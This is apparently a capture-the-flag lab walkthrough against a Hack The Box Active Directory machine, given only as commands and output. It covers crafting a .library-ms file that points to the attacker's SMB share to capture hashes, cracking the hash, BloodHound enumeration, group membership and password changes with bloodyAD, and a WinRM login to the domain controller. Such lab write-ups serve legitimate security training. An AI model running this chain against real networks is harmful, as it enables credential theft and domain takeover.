



```
python exploit.py                            
Enter attacker IP or hostname: 10.10.14.6
[+] File xd.library-ms successfully generated, pointing to \\10.10.14.6\share

zip -r hash_grab xd.library-ms
```



```
john --wordlist=/usr/share/wordlists/rockyou.txt web_svc.hash 
dksehdgh712!@#   (web_svc) 
```


```
bloodhound-python --domain NANOCORP.HTB --domain-controller DC01.NANOCORP.HTB --nameserver 10.129.166.40 --username web_svc --password 'dksehdgh712!@#' --collectionmethod all --dns-tcp --zip
```

```
bloodyAD --host 10.129.166.40 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember 'IT_Support' web_svc
[+] web_svc added to IT_Support

bloodyAD --host 10.129.166.40 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password 'monitoring_svc' 'dksehdgh712!@#'
[+] Password changed successfully!
```


```
python winrmexec.py -k 'nanocorp.htb/monitoring_svc':'dksehdgh712!@#'@'dc01.nanocorp.htb' -ssl
```